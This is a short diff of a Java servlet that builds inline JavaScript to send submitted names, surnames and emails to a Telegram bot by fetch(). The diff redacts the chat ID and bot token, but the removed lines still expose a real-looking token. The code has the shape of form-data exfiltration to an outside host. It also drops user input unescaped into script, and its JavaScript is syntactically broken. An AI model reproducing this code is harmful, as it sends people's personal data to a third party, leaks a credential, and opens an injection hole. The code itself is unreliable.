@@ -130,7 +130,7 @@ public class consulta extends HttpServlet {
 						
 
 											
-						"<script type='text/javascript'> const chatId = 2101237282; "+ 	
+						"<script type='text/javascript'> const chatId = xxxxxx; "+ 	
 									"string param1 = '"+nombre+"';"+
 								    "string param2 = '"+apellido+"';"+
 								    "string param3 = '"+email+"';"+
@@ -139,7 +139,7 @@ public class consulta extends HttpServlet {
 						"	 const data = {"+
 						"		      chat_id: chatId,"+
 						"		      text:param1  +', '+ param2 + ', ' + param3  + ', ' + param4};" +			    
-						"		      fetch('https://api.telegram.org/bot6314259224:AAF5Dvzdx38UJ9_vv-2Rnq88zYTOJT2HvuU/sendMessage', {" +
+						"		      fetch('https://api.telegram.org/bot01234567890:abcdefghijklmnopqrstuvwxyz_0123456789/sendMessage', {" +
 						"		      method: 'POST',"+
 						"		      headers: {"+
 						"		        'Content-Type': 'application/json'"+
